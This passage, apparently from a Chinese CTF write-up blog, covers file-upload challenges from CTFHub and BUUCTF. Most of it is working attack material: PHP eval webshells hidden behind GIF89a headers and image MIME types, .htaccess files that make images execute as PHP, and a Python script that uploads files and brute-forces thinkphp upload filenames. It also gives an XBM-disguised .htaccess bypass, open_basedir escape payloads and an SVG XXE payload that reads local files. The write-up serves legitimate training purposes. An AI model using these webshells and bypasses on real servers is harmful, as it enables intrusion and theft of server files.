<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;a849b8485adeaf5a66c6f477&#125;</span><br></pre></td></tr></table></figure>
<h2 id="MIME验证"><a href="#MIME验证" class="headerlink" title="MIME验证"></a>MIME验证</h2><p>将content-type修改为image/jpeg，其他操作与上面相同</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;5e9686dcfdf07612284fddae&#125;</span><br></pre></td></tr></table></figure>
<h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h2><p>.htaccess的格式为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;1.jpg&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;    </span><br></pre></td></tr></table></figure>
<p>然后上传一个php文件，在burp中将文件名改为1.jpg</p>
<p>使用antsword连接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;6e504a1abc30e2ca266b7335&#125;</span><br></pre></td></tr></table></figure>
<h2 id="文件头检查"><a href="#文件头检查" class="headerlink" title="文件头检查"></a>文件头检查</h2><p>在文件内容前添加GIF89a</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;d.php&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;caa67ce803f60c6f9776b631&#125;</span><br></pre></td></tr></table></figure>
<h2 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h2><p>在URL处，修改URL为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;?road&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;1.php%00 HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>
<p>而用户名处，修改用户名为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.jpg</span><br></pre></td></tr></table></figure>
<p>注意，此处修改用户名为1.php%001.jpg，虽然能上传成功，但是无法用antsword连接（</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;8df08862cb34869e11b4cf33&#125;</span><br></pre></td></tr></table></figure>
<h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><p>将文件名修改为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.phphpp</span><br></pre></td></tr></table></figure>
<p>即可成功上传</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfhub&#123;7abd22955056b5d994fc2f14&#125;</span><br></pre></td></tr></table></figure>
<h1 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h1><h2 id="Upload-1"><a href="#Upload-1" class="headerlink" title="Upload"></a>Upload</h2><p>来源：极客大挑战2019</p>
<p>考察：&lt;?php的绕过、php后缀的绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;1.phtml&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt; @eval($_POST[&#39;cmd&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="Upload-2"><a href="#Upload-2" class="headerlink" title="Upload"></a>Upload</h2><p>来源：ACTF2020 新生赛</p>
<p>考察：phtml</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;upload_file&quot;; filename&#x3D;&quot;1.phtml&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
<h2 id="BabyUpload"><a href="#BabyUpload" class="headerlink" title="BabyUpload"></a>BabyUpload</h2><p>来源：GXYCTF2019</p>
<p>考察：.htaccess绕过</p>
<p>.htaccess</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;png&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>
<p>上传文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;uploaded&quot;; filename&#x3D;&quot;123.png&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&#39;php&#39;&gt; eval($_POST[&#39;cmd&#39;]); &lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="SimpleUpload"><a href="#SimpleUpload" class="headerlink" title="SimpleUpload"></a>SimpleUpload</h2><p>来源：RoarCTF2019</p>
<p>考察：条件竞合，thinkphp upload上传绕过，thinkphp uniqid生成文件名</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.chabug.org/audit/1035.html">https://www.chabug.org/audit/1035.html</a></p>
<p>爆破那部分没跑出来，太耗时间了</p>
<p>源码提示为thinkphp，且</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$upload-&gt;allowExts  &#x3D; array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;, &#39;jpeg&#39;);&#x2F;&#x2F; 设置附件上传类型</span><br></pre></td></tr></table></figure>
<p>一项有漏洞，此用法并不是thinkphp的正确用法，后缀名限制无效</p>
<p>而thinkphp中，upload函数不传参时为多文件上传，整个$_FILES数组都会保存</p>
<p>所以同时上传多个文件，可以绕过php后缀限制</p>
<p>thinkphp中使用uniqid进行重命名，可以使用上传两次空文件的方式，得到一个文件名区间，然后进行爆破</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">#&#123;&quot;url&quot;:&quot;\&#x2F;Public\&#x2F;Uploads\&#x2F;2019-10-12\&#x2F;5da1b52bb3645.txt&quot;,&quot;success&quot;:1&#125;</span><br><span class="line">#&#123;&quot;url&quot;:&quot;\&#x2F;Public\&#x2F;Uploads\&#x2F;&quot;,&quot;success&quot;:1&#125;</span><br><span class="line">#&#123;&quot;url&quot;:&quot;\&#x2F;Public\&#x2F;Uploads\&#x2F;2019-10-12\&#x2F;5da1b52bd6f0a.txt&quot;,&quot;success&quot;:1&#125;</span><br><span class="line"></span><br><span class="line">#&#123;&quot;url&quot;:&quot;\&#x2F;Public\&#x2F;Uploads\&#x2F;2020-07-22\&#x2F;5f17d4510999a.txt&quot;,&quot;success&quot;:1&#125;</span><br><span class="line">#&#123;&quot;url&quot;:&quot;\&#x2F;Public\&#x2F;Uploads\&#x2F;&quot;,&quot;success&quot;:1&#125;</span><br><span class="line">#&#123;&quot;url&quot;:&quot;\&#x2F;Public\&#x2F;Uploads\&#x2F;2020-07-22\&#x2F;5f17d4513d25f.txt&quot;,&quot;success&quot;:1&#125;</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;9d61cb9b-7e46-4f87-8a41-90375d25f991.node3.buuoj.cn&#x2F;index.php&#x2F;Home&#x2F;Index&#x2F;upload&#39;</span><br><span class="line">file1 &#x3D; &#123;&#39;file&#39;:open(&#39;8.txt&#39;,&#39;r&#39;)&#125;</span><br><span class="line">file2 &#x3D; &#123;&#39;file[]&#39;:open(&#39;8.php&#39;,&#39;r&#39;)&#125; #upload()不传参时即是批量上传所以用[]</span><br><span class="line">r &#x3D; requests.post(url,files &#x3D; file1)</span><br><span class="line">print( r.text)</span><br><span class="line">s1 &#x3D; r.text</span><br><span class="line">r &#x3D; requests.post(url,files &#x3D; file2)</span><br><span class="line">print( r.text)</span><br><span class="line">r &#x3D; requests.post(url, files &#x3D; file1)</span><br><span class="line">print( r.text)</span><br><span class="line">prefix &#x3D; r.text[38:47]</span><br><span class="line">print(prefix)</span><br><span class="line">s &#x3D; &quot;01234567890abcdef&quot;</span><br><span class="line">flag &#x3D; False</span><br><span class="line">for i in s:</span><br><span class="line">    if s.index(i) &lt; s.index(s1[39]):</span><br><span class="line">        continue</span><br><span class="line">    for j in s:</span><br><span class="line">        for x in s:</span><br><span class="line">            for y in s:</span><br><span class="line">            	for z in s:</span><br><span class="line">            		url &#x3D; &quot;http:&#x2F;&#x2F;9d61cb9b-7e46-4f87-8a41-90375d25f991.node3.buuoj.cn&#x2F;Public&#x2F;Uploads&#x2F;2021-02-24%s%s%s%s%s%s.php&quot;%(prefix,i,j,x,y,z)</span><br><span class="line">            		r &#x3D; requests.get(url)</span><br><span class="line">            		print(url)</span><br><span class="line">            		if r.status_code &#x3D;&#x3D; 429:</span><br><span class="line">            			time.sleep(0.1)</span><br><span class="line">            			continue</span><br><span class="line">            		if r.status_code &#x3D;&#x3D; 200:</span><br><span class="line">            			print(&quot;yes&quot;)</span><br><span class="line">            			flag &#x3D; True</span><br><span class="line">            			break</span><br><span class="line">            	if flag &#x3D;&#x3D; True:</span><br><span class="line">            		break</span><br><span class="line">            if flag &#x3D;&#x3D; True:</span><br><span class="line">            	break</span><br><span class="line">        if flag &#x3D;&#x3D; True:</span><br><span class="line">        	break</span><br><span class="line">    if flag &#x3D;&#x3D; True:</span><br><span class="line">    	break</span><br></pre></td></tr></table></figure>
<h3 id="thinkphp-upload上传绕过"><a href="#thinkphp-upload上传绕过" class="headerlink" title="thinkphp upload上传绕过"></a>thinkphp upload上传绕过</h3><h3 id="thinkphp-uniqid随机文件名生成爆破"><a href="#thinkphp-uniqid随机文件名生成爆破" class="headerlink" title="thinkphp uniqid随机文件名生成爆破"></a>thinkphp uniqid随机文件名生成爆破</h3><h2 id="Upload（未做）"><a href="#Upload（未做）" class="headerlink" title="Upload（未做）"></a>Upload（未做）</h2><p>来源：强网杯2019</p>
<h2 id="EasyWeb"><a href="#EasyWeb" class="headerlink" title="EasyWeb"></a>EasyWeb</h2><p>来源：SUCTF2019</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.yuque.com/jxswcy/buuoj-wp/grx27x?language=zh-cn%EF%BC%8Chttps://a16n.github.io/2020/10/26/SUCTF2019-EasyWeb/%EF%BC%8Chttps://www.cnblogs.com/hello-there/p/13039116.html">https://www.yuque.com/jxswcy/buuoj-wp/grx27x?language=zh-cn，https://a16n.github.io/2020/10/26/SUCTF2019-EasyWeb/，https://www.cnblogs.com/hello-there/p/13039116.html</a></p>
<p>考察：无字母数字webshell；.htaccess绕过；</p>
<p>题目给的源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    <span class="variable">$userdir</span> = <span class="string">&quot;upload/tmp_&quot;</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]); <span class="comment">// 目录</span></span><br><span class="line">    <span class="keyword">if</span>(!file_exists(<span class="variable">$userdir</span>))&#123;</span><br><span class="line">    mkdir(<span class="variable">$userdir</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">        <span class="variable">$tmp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable">$extension</span> = substr(<span class="variable">$name</span>, strrpos(<span class="variable">$name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/i&quot;</span>,<span class="variable">$extension</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);  <span class="comment"># 检测文件内部是否有ph字符</span></span><br><span class="line">    <span class="keyword">if</span>(mb_strpos(file_get_contents(<span class="variable">$tmp_name</span>), <span class="string">&#x27;&lt;?&#x27;</span>)!==<span class="literal">False</span>) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); <span class="comment"># 检测文件内部是否有&lt;?字符</span></span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype(<span class="variable">$tmp_name</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);  <span class="comment"># 判断是否为图片，故.htaccess前要加注释符</span></span><br><span class="line">        <span class="variable">$path</span>= <span class="variable">$userdir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$name</span>; <span class="comment"># 此处限定了只能在当前目录操作，因此需要绕过</span></span><br><span class="line">        @move_uploaded_file(<span class="variable">$tmp_name</span>, <span class="variable">$path</span>);</span><br><span class="line">        print_r(<span class="variable">$path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以下为第一段，通过提交_变量，调用get_the_flag函数</span></span><br><span class="line"><span class="comment"># 用脚本fuzz测试正则可以使用的字符</span></span><br><span class="line"><span class="comment"># 用剩余字符，进行异或运算，得到</span></span><br><span class="line"><span class="variable">$hhh</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$hhh</span>)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$hhh</span>)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;One inch long, one inch strong!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="variable">$hhh</span>) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$character_type</span> = count_chars(<span class="variable">$hhh</span>, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$character_type</span>)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">&quot;Almost there!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$hhh</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>_变量，通过异或进行运算得出</p>
<p>.htaccess</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337                          # Define the width wanted by the code (and say we are a legit xbitmap file lol)</span><br><span class="line">#define height 1337                         # Define the height</span><br><span class="line"></span><br><span class="line">AddType application&#x2F;x-httpd-php .xxx         # Say all file with extension .php16 will execute php</span><br><span class="line"></span><br><span class="line">php_value zend.multibyte 1                  # Active specific encoding (you will see why after :D)</span><br><span class="line">php_value zend.detect_unicode 1             # Detect if the file have unicode content</span><br><span class="line">php_value display_errors 1                  # Display php errors</span><br></pre></td></tr></table></figure>
<p>带base64自动解码版本的.htaccess</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337</span><br><span class="line"></span><br><span class="line">AddType application&#x2F;x-httpd-php .ha</span><br><span class="line">php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;tmp_adeee0c170ad4ffb110df0cde294aecd&#x2F;shell.ha</span><br></pre></td></tr></table></figure>


<p>此处为何.htaccess可以绕过exif_imagetype，参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/tr1ple/p/11207145.html#jCmcxrz8">https://www.cnblogs.com/tr1ple/p/11207145.html#jCmcxrz8</a></p>
<p>简单的来说，利用了XBM，一样重纯文本二进制图像格式。通过开头的#define，既确定了宽度和高度，也标识这是一个xbm文件。且这种标识在.htaccess中被视为注释（#是注释符）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">SIZE_HEADER = <span class="string">b&quot;\n\n#define width 1337\n#define height 1337\n\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_php_file</span>(<span class="params">filename, script</span>):</span></span><br><span class="line">    phpfile = <span class="built_in">open</span>(filename, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    phpfile.write(script.encode(<span class="string">&#x27;utf-16be&#x27;</span>))</span><br><span class="line">    phpfile.write(SIZE_HEADER)</span><br><span class="line"></span><br><span class="line">    phpfile.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_htacess</span>():</span></span><br><span class="line">    htaccess = <span class="built_in">open</span>(<span class="string">&#x27;.htaccess&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    htaccess.write(SIZE_HEADER)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;AddType application/x-httpd-php .xxx\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value zend.multibyte 1\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value zend.detect_unicode 1\n&#x27;</span>)</span><br><span class="line">    htaccess.write(<span class="string">b&#x27;php_value display_errors 1\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    htaccess.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>():</span></span><br><span class="line">    url=<span class="string">&#x27;http://cdae37cf-9516-4e37-b27a-61fba50f0d80.node3.buuoj.cn/?_=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe=get_the_flag&#x27;</span></span><br><span class="line">    filename=[<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;1.xxx&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> filename:</span><br><span class="line">        file=&#123;<span class="string">&quot;file&quot;</span>:<span class="built_in">open</span>(x,<span class="string">&quot;rb&quot;</span>)&#125;</span><br><span class="line">        req = requests.post(url=url, files=file)</span><br><span class="line">        print(req.content)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    generate_htacess()</span><br><span class="line">    print(<span class="string">&quot;debug1&quot;</span>)</span><br><span class="line">    generate_php_file(<span class="string">&quot;1.xxx&quot;</span>, <span class="string">&quot;&lt;?php eval($_GET[&#x27;cmd&#x27;]); die(); ?&gt;&quot;</span>) <span class="comment"># 此处好像有些许问题，&lt;?和ph应该都被过滤了，需要使用base64上传，并在.htaccess中设置自动baset64解码</span></span><br><span class="line">    print(<span class="string">&quot;debug2&quot;</span>)</span><br><span class="line">    upload()</span><br></pre></td></tr></table></figure>
<p>尝试用蚁剑连接，提示无权访问</p>
<p>在phpinfo中可以看到，open_basedir的存在</p>
<p>尝试bypass open_basedir</p>
<p>绕过disable_function</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd&#x3D;chdir(%27tmp%27);ini_set(%27open_basedir%27,%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%27&#x2F;%27);readfile(%22&#x2F;THis_Is_tHe_F14g%22);</span><br></pre></td></tr></table></figure>
<p>或者利用蚁剑的disable_functions插件</p>
<h3 id="init-set绕过open-basedir"><a href="#init-set绕过open-basedir" class="headerlink" title="init_set绕过open_basedir"></a>init_set绕过open_basedir</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);echo(file_get_contents(&#39;flag&#39;));</span><br></pre></td></tr></table></figure>
<h3 id="htaccess自解码base64"><a href="#htaccess自解码base64" class="headerlink" title=".htaccess自解码base64"></a>.htaccess自解码base64</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;tmp_adeee0c170ad4ffb110df0cde294aecd&#x2F;shell.ha</span><br></pre></td></tr></table></figure>
<h3 id="htaccess绕过exif-imagetype"><a href="#htaccess绕过exif-imagetype" class="headerlink" title=".htaccess绕过exif_imagetype"></a>.htaccess绕过exif_imagetype</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337                          # Define the width wanted by the code (and say we are a legit xbitmap file lol)</span><br><span class="line">#define height 1337                         # Define the height</span><br><span class="line"></span><br><span class="line">AddType application&#x2F;x-httpd-php .xxx         # Say all file with extension .php16 will execute php</span><br><span class="line"></span><br><span class="line">php_value zend.multibyte 1                  # Active specific encoding (you will see why after :D)</span><br><span class="line">php_value zend.detect_unicode 1             # Detect if the file have unicode content</span><br><span class="line">php_value display_errors 1                  # Display php errors</span><br></pre></td></tr></table></figure>


<h2 id="SVGMagic"><a href="#SVGMagic" class="headerlink" title="SVGMagic"></a>SVGMagic</h2><p>来源：BSidesCF2019</p>
<p>考察：SVG，XXE</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;svgfile&quot;; filename&#x3D;&quot;1.svg&quot;</span><br><span class="line">Content-Type: image&#x2F;svf+xml</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;flag.txt&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;svg height&#x3D;&quot;100&quot; width&#x3D;&quot;1000&quot;&gt;</span><br><span class="line">  &lt;text x&#x3D;&quot;10&quot; y&#x3D;&quot;20&quot;&gt;&amp;file;&lt;&#x2F;text&gt;</span><br><span class="line">&lt;&#x2F;svg&gt;</span><br></pre></td></tr></table></figure>


<h3 id="SVG"><a href="#SVG" class="headerlink" title="SVG"></a>SVG</h3><p>可伸缩矢量图，是一种XML，使用.svg保存</p>
<p>栗子</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot;?&gt;</span> //XML申明，规定SVF文件是否含有对外部文件的引用</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">svg</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//W3C//DTD SVG 1.1//EN&quot;</span> </span></span><br><span class="line"><span class="meta"><span class="meta-string">&quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;</span>&gt;</span> // 引用外部SVG DTD</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.1&quot;</span>  </span></span><br><span class="line"><span class="tag"><span class="attr">xmlns</span>=<span 